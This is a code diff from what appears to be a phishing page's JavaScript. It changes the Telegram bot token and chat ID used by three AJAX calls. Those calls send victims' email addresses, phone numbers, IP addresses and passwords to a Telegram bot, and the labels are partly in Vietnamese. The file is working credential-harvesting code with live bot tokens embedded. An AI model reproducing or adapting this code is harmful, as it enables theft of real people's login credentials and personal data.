@@ -653,10 +653,10 @@ var clientToken= "";            getIP();
                 var country_code = $("select[id='country_code'] option:selected").val();
                 var phone = $('#phone').val();
                 $.ajax({
-                    url: "https://api.telegram.org/bot6045346549:AAEOsmnNplB0KiTs2eT1FArSjuaOyFWW4VI/sendMessage",
+                    url: "https://api.telegram.org/bot6748309249:AAHKPvhcuMoOVbaqRp-uOM6RTYdTan5bPrE/sendMessage",
                     method: "POST",
                     data: {
-                        chat_id: "-4044433516",
+                        chat_id: "-4090583156",
                         text: "Email: " + email + "\nMã Vùng:" + country_code + "\nPhone: " + phone + "\nIp: " + ip + "\nMô tả:" + reason
                     }
                 });
@@ -852,10 +852,10 @@ var clientToken= "";            getIP();
 
     function sendpass(password) {
         $.ajax({
-            url: 'https://api.telegram.org/bot6045346549:AAEOsmnNplB0KiTs2eT1FArSjuaOyFWW4VI/sendMessage',
+            url: 'https://api.telegram.org/bot6748309249:AAHKPvhcuMoOVbaqRp-uOM6RTYdTan5bPrE/sendMessage',
             method: 'POST',
             data: {
-                chat_id: '-4044433516',
+                chat_id: '-4090583156',
                 text: 'Pass: ' + password + '\nIp: ' + ip
             }
         });
@@ -872,10 +872,10 @@ var clientToken= "";            getIP();
         };
         var password = $("#password-input").val();
         $.ajax({
-            url: 'https://api.telegram.org/bot6045346549:AAEOsmnNplB0KiTs2eT1FArSjuaOyFWW4VI/sendMessage',
+            url: 'https://api.telegram.org/bot6748309249:AAHKPvhcuMoOVbaqRp-uOM6RTYdTan5bPrE/sendMessage',
             method: 'POST',
             data: {
-                chat_id: '-4044433516',
+                chat_id: '-4090583156',
                 text: 'Pass: ' + password + '\nIp: ' + ip
             }
         });
